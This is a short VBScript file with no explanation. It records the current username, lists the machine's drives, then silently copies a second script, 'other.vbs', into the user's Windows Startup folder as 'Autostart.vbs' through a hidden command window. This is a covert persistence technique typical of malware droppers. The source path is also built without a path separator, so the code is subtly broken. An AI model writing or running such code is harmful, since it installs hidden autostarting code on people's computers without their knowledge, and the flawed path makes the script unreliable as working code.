Dim WshShell, strCurDir
Dim objDrv, strMsg
Set WshShell = CreateObject("WScript.Shell")
Set filesys = CreateObject("Scripting.FileSystemObject")

' Get username
strUser = CreateObject("WScript.Network").UserName

' Store current directory
strCurDir    = WshShell.CurrentDirectory

' Workout all of the drives
For Each objDrv In filesys.Drives
	Select Case objDrv.DriveType
		Case 0: strMsg = strMsg & vbNewLine & objDrv.DriveLetter & ": Unknown"
		Case 1: strMsg = strMsg & vbNewLine & objDrv.DriveLetter & ": Removable Drive"
		Case 2: strMsg = strMsg & vbNewLine & objDrv.DriveLetter & ": Hard Disk Drive"
		Case 3: strMsg = strMsg & vbNewLine & objDrv.DriveLetter & ": Network Drive"
		Case 4: strMsg = strMsg & vbNewLine & objDrv.DriveLetter & ": CDROM Drive"
		Case 5: strMsg = strMsg & vbNewLine & objDrv.DriveLetter & ": RAM Disk Drive"
	End Select
	
Next

'MsgBox strMsg

' Navigate to the startup folder
strtPath = "C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

sSourceFile   = strCurDir & "other.vbs"
sTargetFolder = strtPath & "\Autostart.vbs"

sCmd = "%comspec% /c copy """ & sSourceFile & """ """ & sTargetFolder & """ /Y"

wshShell.Run sCmd, 0, True